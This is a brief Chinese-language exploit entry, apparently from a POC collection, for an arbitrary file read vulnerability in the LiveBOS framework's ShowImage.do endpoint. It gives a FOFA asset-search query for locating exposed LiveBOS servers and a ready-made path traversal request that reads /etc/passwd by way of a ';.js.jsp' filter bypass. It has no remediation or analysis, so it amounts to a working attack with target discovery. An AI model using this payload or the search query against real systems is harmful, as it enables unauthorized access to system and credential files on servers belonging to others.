# LiveBOS ShowImage.do 任意文件读取漏洞

## 网络测绘

fofa: app="LiveBOS-框架"

## POC / EXP

```
/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
```